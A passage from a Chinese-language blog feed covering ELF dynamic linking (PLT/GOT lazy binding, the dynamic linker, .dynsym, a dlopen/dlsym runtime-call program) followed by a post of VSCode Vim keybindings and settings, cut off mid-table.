class="line"></span><br><span class="line">Dynamic section at offset 0xf04 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x3d0</span><br><span class="line"> 0x0000000d (FINI)                       0x5cc</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x1ef8</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x1efc</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x138</span><br><span class="line"> 0x00000005 (STRTAB)                     0x27c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x17c</span><br><span class="line"> 0x0000000a (STRSZ)                      179 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x2000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   16 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x3c0</span><br><span class="line"> 0x00000011 (REL)                        0x370</span><br><span class="line"> 0x00000012 (RELSZ)                      80 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x350</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x330</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   3</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></blockquote><p>每个模块外的函数都有一个.rel.plt表项，每个表项大小都是16字节，前两项特殊</p><ul><li>第一项<ul><li>pushq *GOT[1];jmpq *GOT[2]</li><li>因为每一个函数延迟绑定时都需要执行上面这两条指令，为了减少重复代码就把他们放到了固定位置，供调用</li></ul></li><li>第二项是系统启动函数__libc_start_main来初始化环境</li></ul><p>剩下的都是jmp *got[id]; push id;jump plt[0];的16字节指令</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506013722990.png" alt="image-20230506013722990"></p><ol><li>第一次调用函数是进入函数所在plt表条目</li><li>第一条plt指令跳到对应got表存储地址，由于刚开始每个GOT条目都指向对应PLT条目的第二条指令，故回到plt条目中</li><li>将函数id压入栈，跳到plt[0]条目</li><li>plt[0]把got[1]压入栈通过gotp[2]调用动态链接器，动态链接器确定函数真实地址并填入got条目</li><li>再次回到该函数调用这次及以后可以直接通过plt表找到函数真实地址</li></ol><p>看个实际例子，害，还是经典的hello world，看printf是如何lazy binding的</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014213830.png" alt="image-20230506014213830"></p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014305987.png" alt="image-20230506014305987"></p><p>jmp到printf got表项里的值</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014448462.png" alt="image-20230506014448462"></p><p>没有做重定位时默认就是下一条指令，把函数id压栈</p><p>jmp到0x4003f0执行</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015302033.png" alt="image-20230506015302033"></p><p>随后jmp到0x601010里存的动态链接的函数入口_dl_runtime_resolve_xsavec</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015707950.png" alt="image-20230506015707950"></p><p>跳到printf的同时往got里写入真实地址</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015613569.png" alt="image-20230506015613569"></p><p>下次就可以直接跳过去了</p><h2 id="动态链接器"><a href="#动态链接器" class="headerlink" title="动态链接器"></a>动态链接器</h2><h3 id="interp"><a href="#interp" class="headerlink" title=".interp"></a>.interp</h3><p>interp段规定了可执行程序的动态链接器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -p .interp  a.out</span><br><span class="line">String dump of section &#x27;.interp&#x27;:</span><br><span class="line">  [     0]  /lib/ld-linux.so.2</span><br></pre></td></tr></table></figure><p>&#x2F;lib&#x2F;ld-linux.so.2是一个符号链接，这样我们更新动态库的时候只需要把符号链接链接到新库上，而不用更改程序本体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; ll  /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root <span class="number">25</span> Apr <span class="number">22</span>  <span class="number">2021</span> /lib/ld-linux.so<span class="number">.2</span> -&gt; i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br></pre></td></tr></table></figure><p>动态链接器也是一个特殊共享文件，而且他是可执行的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; file /lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br><span class="line">/lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, BuildID[sha1]=<span class="number">2b</span>ea6d29e841fecacc546b9b5ab802bd061e8b29, stripped</span><br></pre></td></tr></table></figure><p>他是动态链接的,但是他不能依赖如何库(所以在ldd进行分析的时候，会把他分析为静态链接)，在重定位之前不能调用任何放在got里的任何东西，挺夸张的，毕竟自己定义的函数也会被放到got里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; ldd /lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br><span class="line">        statically linked</span><br></pre></td></tr></table></figure><blockquote><p>关于ldd</p><p>ldd其实是一段shell脚本</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; file /usr/bin/ldd</span><br><span class="line">/usr/bin/ldd: Bourne-Again shell script, ASCII text executable</span><br></pre></td></tr></table></figure><p>他会尝试从下面几个ld去解析文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RTLDLIST=<span class="string">&quot;/lib/ld-linux.so.2 /lib64/ld-linux-x86-64.so.2 /libx32/ld-linux-x32.so.2&quot;</span></span><br></pre></td></tr></table></figure><p>ld 会有如下的选项，用来模拟加载找到依赖，但不会执行文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--<span class="built_in">list</span>                <span class="built_in">list</span> all dependencies and how they are resolved</span><br></pre></td></tr></table></figure><p>所以我们下面会得到相同的东西，程序开了pie所以加载地址会不同</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; ldd a.out</span><br><span class="line">    linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffde81e7000</span>)</span><br><span class="line">    libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f68d5200000</span>)</span><br><span class="line">    /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f68d54ab000</span>)</span><br><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --<span class="built_in">list</span> ./a.out</span><br><span class="line">    linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff141e7000</span>)</span><br><span class="line">    libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007efd08400000</span>)</span><br><span class="line">    /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007efd08773000</span>)</span><br></pre></td></tr></table></figure></blockquote><p>他也会被随机映射到内存，所以他也会有个重定位的过程，这个过程由他自己完成，叫做自举</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506091935404.png" alt="image-20230506091935404"></p><p>所以对于动态链接的程序，操作系统在完成程序映射到进程空间后，不会再像静态链接的程序那样把控制权给到程序的入口地址，而是给到动态链接器的自举代码入口，接下来就是根据dynamic里保存的信息去做符号的整合和重定位，如果动态库有.init或.finit段会去先执行这些段里的指令(例如c++里的全局对象的构造和析构函数)，随后才把控制权转移到可执行文件的入口函数</p><p>所以我们可以把程序直接交给动态链接器，也可以跑起来</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>  ./a.out</span><br><span class="line">hello⏎     </span><br></pre></td></tr></table></figure><h3 id="动态符号表-dynsym"><a href="#动态符号表-dynsym" class="headerlink" title="动态符号表 .dynsym"></a>动态符号表 .dynsym</h3><p>.symtab一般保存了所有符号，.dynsym只保存了动态链接的符号，数据结构用的是一样的，.dynstr保存了动态符号字符串表</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -s xxx.so</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">16</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND b</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2<span class="number">.1</span><span class="number">.3</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND ext</span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses</span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable</span><br><span class="line">     <span class="number">8</span>: <span class="number">00002018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">22</span> _edata</span><br><span class="line">     <span class="number">9</span>: <span class="number">00000570</span>    <span class="number">50</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> bar</span><br><span class="line">    <span class="number">10</span>: <span class="number">00002020</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">23</span> x</span><br><span class="line">    <span class="number">11</span>: <span class="number">000005</span>a2    <span class="number">35</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> foo</span><br><span class="line">    <span class="number">12</span>: <span class="number">00002024</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">23</span> _end</span><br><span class="line">    <span class="number">13</span>: <span class="number">00002018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">23</span> __bss_start</span><br><span class="line">    <span class="number">14</span>: <span class="number">000003</span>d0     <span class="number">0</span> FUNC    GLOBAL DEFAULT    <span class="number">9</span> _init</span><br><span class="line">    <span class="number">15</span>: <span class="number">000005</span>cc     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> _fini</span><br></pre></td></tr></table></figure><h2 id="显示的运行时链接"><a href="#显示的运行时链接" class="headerlink" title="显示的运行时链接"></a>显示的运行时链接</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SETUP_STACK                                               \</span></span><br><span class="line"><span class="meta">    i = 2;                                                        \</span></span><br><span class="line"><span class="meta">    while (++i &lt; argc - 1) &#123;                                      \</span></span><br><span class="line"><span class="meta">        switch (argv[i][0]) &#123;                                     \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;i&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                asm volatile(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(atoi(&amp;argv[i][1]))); \</span></span><br><span class="line"><span class="meta">                esp += 4;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;d&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                atof(&amp;argv[i][1]);                                \</span></span><br><span class="line"><span class="meta">                asm volatile(                                     \</span></span><br><span class="line"><span class="meta">                    <span class="string">&quot;subl $8,%esp\n&quot;</span>                              \</span></span><br><span class="line"><span class="meta">                    <span class="string">&quot;fstpl (%esp)&quot;</span>);                              \</span></span><br><span class="line"><span class="meta">                esp += 8;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;s&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                asm volatile(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(&amp;argv[i][1]));       \</span></span><br><span class="line"><span class="meta">                esp += 4;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            default:                                              \</span></span><br><span class="line"><span class="meta">                printf(<span class="string">&quot;error argument type&quot;</span>);                    \</span></span><br><span class="line"><span class="meta">                goto exit_runso;                                  \</span></span><br><span class="line"><span class="meta">        &#125;                                                         \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RESTORE_STACK asm volatile(<span class="string">&quot;add %0,%%esp&quot;</span> ::<span class="string">&quot;r&quot;</span>(esp))</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">void</span>* handle;</span><br><span class="line">    <span class="type">char</span>* error;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> esp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* func;</span><br><span class="line">    handle = dlopen(argv[<span class="number">1</span>], RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t find library: %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    func = dlsym(handle, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Find symbol %s error: %s\n&quot;</span>, argv[<span class="number">2</span>], error);</span><br><span class="line">        <span class="keyword">goto</span> exit_runso;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (argv[argc - <span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">int</span> (*func_int)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">int</span> ret = func_int();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">double</span> (*func_double)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">double</span> ret = func_double();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %f\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">char</span>* (*func_str)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">char</span>* ret = func_str();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %s\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">void</span> (*func_void)() = func;</span><br><span class="line">            SETUP_STACK</span><br><span class="line">            <span class="title function_">func_void</span><span class="params">()</span>;</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = void&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  <span class="comment">// end of switch</span></span><br><span class="line">exit_runso:</span><br><span class="line">    dlclose(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; gcc -m32 get.c -ldl</span><br><span class="line">get.c: In function ‘main’:</span><br><span class="line">get.c:<span class="number">8</span>:<span class="number">46</span>: warning: implicit declaration of function ‘atoi’ [-Wimplicit-function-declaration]</span><br><span class="line">                 <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(atoi(&amp;argv[i][<span class="number">1</span>])))</span>; \</span><br><span class="line">                                              ^</span><br><span class="line">get.c:<span class="number">47</span>:<span class="number">13</span>: note: in expansion of macro ‘SETUP_STACK’</span><br><span class="line">             SETUP_STACK;</span><br><span class="line">             ^</span><br><span class="line">get.c:<span class="number">12</span>:<span class="number">17</span>: warning: implicit declaration of function ‘atof’ [-Wimplicit-function-declaration]</span><br><span class="line">                 atof(&amp;argv[i][<span class="number">1</span>]);                                \</span><br><span class="line">                 ^</span><br><span class="line">get.c:<span class="number">47</span>:<span class="number">13</span>: note: in expansion of macro ‘SETUP_STACK’</span><br><span class="line">             SETUP_STACK;</span><br><span class="line">             ^</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; </span><br><span class="line">./a.out  /lib/i386-linux-gnu/libm<span class="number">-2.23</span>.so <span class="built_in">sin</span> d2<span class="number">.0</span> d</span><br><span class="line">ret = <span class="number">0.909297</span></span><br></pre></td></tr></table></figure><p>由于库里有非常多的函数，我们不可能为每一个函数都定于一个函数指针，这段代码有意思的点在于他把返回值的情况都列了出来，然后调用空函数前自己去传参，调用后自己去平栈，其中定义了全局变量esp来记录需要平栈的大小</p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM</title>
      <link href="/2023/04/30/VIM/"/>
      <url>/2023/04/30/VIM/</url>
      
        <content type="html"><![CDATA[<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>用来几天vim发现自己喜欢上了vim的模式，把所有ide能用vim插件的都改用vim了 总体来说vsc体验最好 jet全家桶ideavim还可以，vs2022 vim体验并不好，可能以后换Clion了,但是感觉clion的调试功能没有vs2022好，淦，这种东西自己舒服才是最重要的</p><h2 id="VSCODE-vim"><a href="#VSCODE-vim" class="headerlink" title="VSCODE vim"></a>VSCODE vim</h2><h3 id="nomal模式"><a href="#nomal模式" class="headerlink" title="nomal模式"></a>nomal模式</h3><p>a在光标后插入 A在行尾插入 这样我们可以用A;很方便的在行尾加分号</p><p>i在光标前插入 I在行首插入</p><p>o下行插入 O上行插入</p><p>f {char}跳到下一个char位置 F{char} 上一个</p><p>; 重复上次字符查找  ,反向查找上次查找 .可以重复上一次命令</p><p>d 删除(剪切) c修改 y复制 p粘贴 u撤销 </p><p>x删除光标处，r修改光标处</p><p>&#x3D;&#x3D;自动缩进</p><p><em>“ Ctrl-u 向上移动半屏</em></p><p><em>“ Ctrl-d 向下移动半屏</em></p><p><em>“ Ctrl-b 向上移动一屏</em></p><p><em>“ Ctrl-f 向下移动一屏</em></p><p><em>“ gg 到文档开头</em></p><p><em>“ G 到文档结尾</em></p><p><em>“ H 到屏幕顶部</em> head</p><p><em>“ M 到屏幕中间 middle</em></p><p><em>“ L 到屏幕底部 last</em></p><p>“ayy 复制当前行到a寄存器中</p><p>“Ayy 追加当前当到a寄存器.</p><p>“ap 粘贴a寄存器中的值</p><p><num> j和<num> k跳转相对num行</num></num></p><h4 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h4><p><img src="/2023/04/30/VIM/image-20230430152911270.png" alt="image-20230430152911270"></p><p>w 下一个单词开头</p><p>b 本单词或者上一个单词开头(back)</p><p>e 本单词或下一个单词结尾(end)</p><p>0 绝对行首 ^行首 $行尾</p><p>gg 第一行 G最后一行</p><h4 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h4><p>a是around i是inner 标识符:() &lt;&gt; {} 等</p><p>c&#x2F;d&#x2F;y iw操作一个的单词</p><p>c&#x2F;d&#x2F;y i标识符 操作被符号包裹着的单词</p><p>c&#x2F;d&#x2F;y a标示符 连同符号一起操作</p><p>对于大括号{}里的语句还可以用c&#x2F;d&#x2F;y iB或c&#x2F;d&#x2F;y aB来操作</p><p>对于小括号()里的语句可以用c&#x2F;d&#x2F;y ib或c&#x2F;d&#x2F;y ab来操作</p><p>dd yy cc操作一行 前面加数字就可以操作n行</p><p>c&#x2F;d&#x2F;y f {char}一直操作到char</p><p>c&#x2F;d&#x2F;y i或a e操作整个文件</p><p>上面的还可以自由搭配比如de什么的</p><h3 id="VISUAL模式"><a href="#VISUAL模式" class="headerlink" title="VISUAL模式"></a>VISUAL模式</h3><p>大同小异</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>gd 转到函数定义 (goto defination)</p><p>gh 查看参数提示等 (hover悬停)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;vim.highlightedyank.enable&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.showMarksInGutter&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.sneakReplacesF&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.easymotion&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.incsearch&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.useSystemClipboard&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.useCtrlKeys&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.hlsearch&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.sneak&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.insertModeKeyBindings&quot;</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;j&quot;</span>,</span><br><span class="line">      <span class="string">&quot;k&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;Esc&gt;&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;vim.normalModeKeyBindingsNonRecursive&quot;</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;leader&gt;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;d&quot;</span>,</span><br><span class="line">      <span class="string">&quot;d&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;C-n&gt;&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;:nohl&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;K&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;lineBreakInsert&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;silent&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;S-L&gt;&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;:tabnext&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;S-H&gt;&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;:tabprevious&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;S-Q&gt;&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;:q!&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;g&quot;</span>,</span><br><span class="line">      <span class="string">&quot;r&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;editor.action.goToReferences&quot;</span></span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;leader&gt;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;editor.debug.action.toggleBreakpoint&quot;</span></span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&lt;leader&gt;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;editor.action.formatDocument&quot;</span></span><br><span class="line">    ],</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;vim.leader&quot;</span>: <span class="string">&quot;&lt;space&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;vim.handleKeys&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;&lt;C-a&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-f&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-z&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-v&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-c&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-x&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-n&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-w&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-p&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-b&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-t&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-j&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>ctrl o回到光标的上次，ctrl + i下次光标位置、</p><p>gcc给当前行添加注释 gc3j包括当前行4行添加注释 gciB gcaB等可以自己搭配</p><table><thead><tr><th><code>y s &lt;motion&gt; 